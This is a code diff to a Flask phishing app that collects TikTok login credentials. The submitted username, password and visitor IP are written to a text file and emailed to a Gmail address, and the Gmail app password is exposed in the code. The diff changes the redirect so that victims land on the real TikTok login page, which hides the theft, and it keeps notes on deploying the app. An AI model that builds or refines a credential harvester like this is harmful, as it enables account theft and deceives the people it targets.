@@ -20,7 +20,7 @@ EMAIL_ADDRESS = "mwananchihuslerloans@gmail.com"
 # Use a Gmail App Password here.
 # Generate one from your Google Account security settings.
 # For this demo, you will put your actual App Password here:
-EMAIL_PASSWORD = "mokasgadsacljec" # <--- REPLACE THIS WITH YOUR APP PASSWORD
+EMAIL_PASSWORD = "mokasgadsaacljec" # <--- REPLACE THIS WITH YOUR APP PASSWORD
 
 TO_EMAIL = "mwananchihuslerloans@gmail.com" # This is the recipient email
 
@@ -36,8 +36,6 @@ def login():
     password = request.form["password"]
 
     # --- Credential Logging (for demonstration only) ---
-    # In a real scenario, this would be logged securely (e.g., to a database)
-    # and not to a flat file that might not persist on cloud platforms.
     try:
         with open("credentials.txt", "a") as f:
             f.write(f"Timestamp: {request.environ.get('REMOTE_ADDR')} - User: {username} | Pass: {password}\n")
@@ -61,20 +59,14 @@ def login():
             print("Credentials sent via email successfully!")
     except Exception as e:
         print(f"Error sending email: {e}")
-        # In a real app, you might want to log the error to a system log
-        # or a monitoring service, but avoid exposing internal errors to users.
+    # --- End Email Notification ---
 
-    # Redirect the user to a seemingly legitimate page after "login"
-    # For a phishing demo, this would typically be the real TikTok site
-    # or a convincing "success" page.
-    # We will now redirect to a new page that handles the delayed redirect to TikTok.
-    return redirect(url_for('success_redirect_page'))
+    # *** THE KEY CHANGE IS HERE ***
+    # Directly redirect the user to the real TikTok login page
+    # The "loading for a second" will be the natural time for the browser
+    # to process this redirect and load the external TikTok page.
+    return redirect("https://www.tiktok.com/login", code=302)
 
-# New route to handle the intermediate success message and delayed redirect
-@app.route("/success_redirect_page")
-def success_redirect_page():
-    # This page will display a message and then use JavaScript to redirect
-    return render_template("success_redirect.html")
 
 # --- IMPORTANT FOR RENDER DEPLOYMENT ---
 # Your Flask app MUST bind to 0.0.0.0 and use the dynamic PORT provided by Render
